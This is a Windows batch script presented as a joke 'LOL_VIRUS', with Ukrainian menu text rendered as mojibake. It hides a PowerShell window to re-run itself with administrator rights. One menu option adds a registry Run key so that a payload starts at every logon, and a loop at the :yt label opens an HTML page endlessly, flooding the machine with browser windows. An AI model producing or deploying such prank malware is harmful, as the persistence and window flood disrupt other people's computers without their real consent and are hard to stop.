@echo off
call :Adm
title ����i�� ��஫�...
chcp 866
color a
cls
goto pwd

:pwd
echo ��� ��᪠, ����i�� ��஫� (? �� ����?��� ��������)

echo.
Set /p choice="��஫�: "
if not defined choice goto pwd
if "%choice%"=="ggytprgs" (goto vir)
if "%choice%"=="?" (goto ?)
cls
goto pwd

:vir
title LOL_VIRUS By GGYT Progs and help from DiopinYT
cls
type C:\LOL_VIRUS\files\art.txt
echo �����i�� �i�:
echo.
echo 1 - ���� ����� ��
echo 2 - ����
echo 3 - �� ��������
echo 4 - ������� �?��� ?� ��⮧����⠦����
echo 5 - ����� �������� (�� ᪮�)
echo 6 - �� ��� �i���?
echo 7 - ???

echo.
Set /p choice="��� ���i�: "
if not defined choice goto vir
if "%choice%"=="1" (goto q)
if "%choice%"=="2" (goto exit)
if "%choice%"=="3" (start C:\LOL_VIRUS\files\languages\ukr\NOT_OPEN_ME_PLEASE.html)
if "%choice%"=="4" (goto delregstartup)
if "%choice%"=="5" (goto vir)
if "%choice%"=="6" (goto path)
if "%choice%"=="7" (goto secrpwd)
cls
goto vir

:exit
set choice=0
cls
echo �� �筮 ��� ����? (y/n)
Set /p choice="���i�: "
if not defined choice goto exit
if "%choice%"=="n" (goto vir)
if "%choice%"=="y" (exit)
cls
goto exit

:q
echo �� �������i, � ��� �஡�� �? (y/n)

echo.
Set /p choice="���i�: "
if not defined choice goto q
if "%choice%"=="y" (goto q2)
if "%choice%"=="n" (goto vir)
cls
goto q

:q2
echo ������� ������������!!!
echo �� �ணࠬ� �㤥 �������� ������� ࠧ�, ���� �� ������� �i� �� / ������� !!! �� �������i � ᢮i� �?��? (y/n)
echo �����!!!

echo.
Set /p choice="���I�: "
if not defined choice goto q2
if "%choice%"=="y" (goto xd)
if "%choice%"=="n" (goto vir)

:xd
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LOL_VIRUS /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
goto yt

:yt
cd C:\LOL_VIRUS\files\
start base.html
goto yt

:delregstartup
cls
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LOL_VIRUS /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
echo �?��� �� ������ ��������
pause
goto vir

:path
cls
echo.
echo �i� � C:\LOL_VIRUS
pause
goto vir

:secrpwd
cls
echo �����? ���� � ������ �?����
echo n - ����

echo.
Set /p choice="����: "
if not defined choice goto secrpwd
if "%choice%"=="14qw5t09" (goto rr)
if "%choice%"=="n" (goto vir)
cls
goto secrpwd

:rr
start C:\LOL_VIRUS\files\NGGYU.url
goto vir

:?
echo ��⠩ 㢠��i� � ���� ९�����ii. �i� ⠬ ����ᠭ��.
pause
goto pwd

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)





